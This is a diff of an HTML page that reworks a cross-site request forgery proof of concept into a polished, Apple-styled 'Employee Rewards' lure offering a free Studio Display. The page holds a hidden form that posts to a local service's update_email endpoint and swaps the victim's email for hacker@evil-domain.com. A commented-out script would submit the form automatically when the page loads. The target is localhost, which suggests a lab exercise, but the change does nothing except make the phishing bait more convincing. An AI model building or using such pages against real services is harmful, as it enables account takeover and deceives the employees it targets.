@@ -1,25 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>You Won a Prize!</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Employee Rewards — Claim Your Gift</title>
+    <style>
+        body {
+            margin: 0;
+            background: #f5f5f7;
+            color: #1d1d1f;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif;
+            display: grid;
+            place-items: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+        .promo-card {
+            background: #ffffff;
+            padding: 48px 40px;
+            border-radius: 22px;
+            box-shadow: 0 12px 36px rgba(0, 0, 0, 0.08);
+            max-width: 440px;
+        }
+        .badge {
+            color: #bf4800;
+            font-size: 0.78rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+        }
+        h1 {
+            font-size: 2rem;
+            margin: 10px 0 12px;
+            letter-spacing: -0.03em;
+        }
+        p {
+            color: #86868b;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+        .btn-claim {
+            background: #0071e3;
+            color: #ffffff;
+            border: none;
+            padding: 14px 32px;
+            font-size: 1rem;
+            font-weight: 500;
+            border-radius: 980px;
+            cursor: pointer;
+        }
+        .btn-claim:hover {
+            background: #0077ed;
+        }
+    </style>
 </head>
 <body>
-    <h2>Congratulations! You've won a free gift card.</h2>
-    <p>Click the button below to claim your prize.</p>
-    
-    <!-- 
-      The payload: A form pointing to the target service's action endpoint.
-      Because parameters are predictable (just "email"), the attacker can pre-fill it.
-    -->
-    <form action="http://127.0.0.1:5000/update_email" method="POST" id="csrf-form">
-        <input type="hidden" name="email" value="hacker@evil-domain.com">
-        <input type="submit" value="Claim Prize Now!">
-    </form>
+    <div class="promo-card">
+        <span class="badge">Special Event</span>
+        <h1>You've won an Apple Studio Display.</h1>
+        <p>Confirm your employee eligibility below to claim your reward voucher immediately.</p>
 
-    <!-- 
-      Optional: Uncomment the script below to make it a "Zero-Click" attack.
-      This will auto-submit the form as soon as the page loads.
-    -->
+        <!-- CSRF Payload pointing to the target service's action endpoint -->
+        <form action="http://127.0.0.1:5000/update_email" method="POST" id="csrf-form">
+            <input type="hidden" name="email" value="hacker@evil-domain.com">
+            <button type="submit" class="btn-claim">Claim Reward Now</button>
+        </form>
+    </div>
+
+    <!-- Optional Zero-Click Auto-Submit -->
     <!-- <script>document.getElementById('csrf-form').submit();</script> -->
 </body>
 </html>
